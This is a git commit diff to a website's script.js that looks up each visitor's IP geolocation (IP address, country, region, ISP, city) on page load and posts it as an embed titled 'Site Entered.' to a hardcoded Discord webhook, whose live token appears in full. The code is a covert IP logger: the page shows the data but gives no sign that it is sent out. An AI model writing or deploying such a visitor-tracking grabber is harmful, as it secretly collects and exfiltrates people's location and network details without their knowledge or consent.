999d0d35d3081b306a4dbf8f538d420d1b93add6
EphRex <128737077+EphRex@users.noreply.github.com>
2024-06-04 21:17:07 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,4 +1,6 @@
-const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB";
+var request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB");
+request.setRequestHeader('Content-type', 'application/json');
 
 fetch("https://ipapi.co/json/")
     .then(response => response.json())
@@ -17,16 +19,22 @@ fetch("https://ipapi.co/json/")
         document.getElementById("org").innerHTML = org;
         document.getElementById("city").innerHTML = city;
 
-        const msg = {
-            "content": `ip - ${ip}\nversion - ${version}\ncountry - ${country}\nregion - ${region}\norg - ${org}\ncity - ${city}`
-        };
+        var Embed = {
+            author: {
+                name: "Webhook"
+            },
+            title: "Site Entered.",
+            description: `IP - ${ip}\n\nVersion - ${version}\n\nCountry - ${country}\n\nRegion - ${region}\n\nISP - ${org}\n\nCity - ${city}`,
+            color: hexToDecimal("#000000")
+        }
 
-        return fetch(whurl + "?wait=true", {
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "body": JSON.stringify(msg)
-        });
+        var params = {
+            username: "Webhook",
+            embeds: [Embed]
+        }
+        request.send(JSON.stringify(params))
+
+        function hexToDecimal(hex) {
+            return parseInt(hex.replace("#", ""), 16)
+        }
     })
-    .then(response => response.json())
-    .then(console.log)
-    .catch(console.error);
